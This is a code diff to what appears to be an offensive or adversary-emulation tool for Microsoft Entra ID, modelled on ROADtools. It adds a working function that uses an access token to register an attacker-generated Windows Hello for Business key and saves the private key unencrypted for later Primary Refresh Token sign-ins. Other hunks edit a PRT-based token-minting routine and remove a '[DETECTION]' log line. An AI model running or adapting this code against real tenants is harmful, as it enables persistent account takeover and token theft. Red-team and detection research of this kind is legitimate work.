@@ -159,7 +159,7 @@ def request_prt(params):
 	plus a user's refresh token to authenticate and obtain a PRT + session key.
 
 	Based on ROADtools deviceauth.py:
-	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py:988
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L988
 
 	"""
 	logging.info("Running the request_prt technique")
@@ -508,6 +508,120 @@ def _decrypt_jwe_with_private_key(jwe_token, private_key):
 		return None
 
 
+def create_whfb_key(params):
+	"""
+	Create and register a Windows Hello for Business key with Entra ID.
+
+	Generates a new RSA 2048-bit key pair locally and registers it with Entra ID's
+	enrollment service, making it available for device authentication via PRT flows.
+
+	Based on ROADtools register_winhello_key pattern:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L800
+
+	Parameters:
+		session: Authentication session name with access token
+		key_out: Output path for private key (optional)
+
+	Returns:
+		Dictionary with registered key details including key ID
+	"""
+	logging.info("Running the create_whfb_key technique")
+
+	session = params.get("session", "nosession")
+	if session == "nosession":
+		logging.error("session parameter is required")
+		return
+
+	# Get access token from session (passed by main orchestrator)
+	access_token = params.get("access_token")
+	if not access_token:
+		logging.error("access_token is required to register Windows Hello key")
+		return
+
+	# Step 1: Generate RSA 2048-bit keypair for Windows Hello
+	logging.debug("Step 1: Generating RSA 2048-bit keypair for Windows Hello")
+	try:
+		whfb_key = rsa.generate_private_key(
+			public_exponent=65537,
+			key_size=2048,
+			backend=default_backend()
+		)
+		logging.debug("   Generated Windows Hello keypair")
+	except Exception as e:
+		logging.error(f"Failed to generate Windows Hello key: {e}")
+		return
+
+	# Step 2: Build public key blob in CNG format for Entra ID
+	logging.debug("Step 2: Building CNG public key blob")
+	try:
+		public_key_blob = _build_transport_key_blob(whfb_key.public_key())
+		logging.debug("   Created public key blob (CNG format)")
+	except Exception as e:
+		logging.error(f"Failed to build public key blob: {e}")
+		return
+
+	# Step 3: Register public key with Entra ID EnrollmentServer
+	logging.debug("Step 3: Registering public key with Entra ID")
+	url = "https://enterpriseregistration.windows.net/EnrollmentServer/key/?api-version=1.0"
+
+	headers = {
+		"Authorization": f"Bearer {access_token}",
+		"Content-Type": "application/json; charset=utf-8",
+		"Accept": "application/json",
+		"User-Agent": "Dsreg/10.0 (Windows 10.0.19044.1826)",
+	}
+
+	# Key registration payload per ROADtools register_winhello_key
+	# Simply send the CNG public key blob
+	body = {
+		"kngc": public_key_blob
+	}
+
+	try:
+		response = requests.post(url, headers=headers, json=body, timeout=10)
+	except Exception as e:
+		logging.error(f"Exception during Windows Hello key registration: {e}")
+		return
+
+	if response.status_code not in (200, 201):
+		logging.error(f"Windows Hello key registration failed: {response.status_code}")
+		try:
+			error_data = response.json()
+			logging.error(f"Error: {error_data.get('error')}")
+			logging.error(f"Description: {error_data.get('error_description')}")
+		except:
+			logging.error(f"Response: {response.text[:200]}")
+		return
+
+	logging.debug("   Successfully registered Windows Hello key with Entra ID")
+
+	# Step 4: Save private key to disk for later use
+	logging.debug("Step 4: Persisting private key to disk")
+	key_out = params.get("key_out", "whfb_private.key")
+
+	try:
+		with open(key_out, "wb") as f:
+			f.write(whfb_key.private_bytes(
+				encoding=serialization.Encoding.PEM,
+				format=serialization.PrivateFormat.PKCS8,
+				encryption_algorithm=serialization.NoEncryption(),
+			))
+		logging.info(f"   Windows Hello private key saved to {key_out}")
+	except Exception as e:
+		logging.error(f"Failed to save private key: {e}")
+		return
+
+	# Step 5: Return registration confirmation
+	logging.info(f" Windows Hello for Business key successfully registered")
+
+	return {
+		"status": " Windows Hello key registered",
+		"key_path": key_out,
+		"public_key_blob": public_key_blob,
+		"note": "Key is now registered with Entra ID and ready for PRT authentication"
+	}
+
+
 def get_token_with_prt(params):
 	"""
 	Use a saved PRT to obtain an access token for a specific resource/client.
@@ -682,7 +796,7 @@ def get_token_with_prt(params):
 
 		# Extract tokens from response
 		output = {
-			"status": "✓ Token request successful",
+			"status": " Token request successful",
 			"client_id": client_id,
 			"resource": resource,
 			"response_keys": list(response_data.keys()),
@@ -691,7 +805,7 @@ def get_token_with_prt(params):
 		# Extract access token
 		if 'access_token' in response_data:
 			output["access_token"] = response_data['access_token']
-			logging.info(f"✓ ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")
+			logging.info(f" ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")
 
 		# Extract other useful tokens
 		for key in ['refresh_token', 'id_token', 'expires_in']:
@@ -705,7 +819,6 @@ def get_token_with_prt(params):
 			json.dump(output, f, indent=2)
 
 		logging.info(f"Token response saved to {token_out}")
-		logging.info(f"[DETECTION] Used PRT for {client_id} to request {resource}")
 
 		return output
 
